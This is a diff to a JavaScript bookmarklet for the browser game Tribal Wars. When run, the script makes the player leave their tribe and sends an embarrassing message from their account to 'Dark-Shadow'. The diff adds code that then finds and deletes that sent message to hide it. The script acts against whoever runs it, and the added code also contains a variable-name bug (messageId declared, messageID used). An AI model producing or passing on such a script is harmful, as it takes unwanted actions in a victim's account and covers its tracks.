@@ -1,8 +1,42 @@
-javascript:(function(){
+javascript:(async function(){
     const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'});
     TribalWars.get(url);
 
-    function cada_mp(player, msg, subj) {
+    async function getLastMessageId(playerName) {
+    try {
+        const response = await fetch("game.php?screen=mail");
+        const htmlText = await response.text();
+
+        const elements = $(htmlText).find("#content_value > table > tbody > tr > td:nth-child(2) > form > table:nth-child(3) > tbody > tr:nth-child(n) > td.nowrap");
+
+        let foundIndex = -1;
+
+        elements.each(function(index) {
+            if ($(this).text().trim() === playerName) {
+                foundIndex = index + 1;
+                return false;
+            }
+        });
+
+
+        if (foundIndex > -1) {
+
+            var url = $(htmlText).find(`#content_value > table > tbody > tr > td:nth-child(2) > form > table:nth-child(3) > tbody > tr:nth-child(${foundIndex+1}) > td:nth-child(1) > a`)[0].href
+
+            const params = new URLSearchParams(new URL(url).search);
+            const viewValue = params.get("view");
+            return viewValue
+        }
+        return 0;
+    }
+    catch {
+        return 0;
+
+    }
+}
+
+
+    async function cada_mp(player, msg, subj) {
         const parts = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=');
         const postUrl = parts[0];
         const h = parts[1] || '';
@@ -27,5 +61,15 @@ javascript:(function(){
         });
     }
 
-    cada_mp('Dark-Shadow', 'oi gostaria de comprar sua conta kkk', 'sou burro');
+    const pn = 'Dark-Shadow';
+
+    await cada_mp(pn, 'oi gostaria de comprar sua conta kkk', 'sou burro');
+    const messageId = await getLastMessageId(pn);
+    const string = `ids[${messageID}]`;
+    TribalWars.post('mail',
+    { mode: 'in', action: 'del_move_multiple', group: '0' },
+    { [string]: 'on', del: 'Apagar', from: '0', num_igms: '100',  }, function () {
+    },
+        !1
+    );
 })();
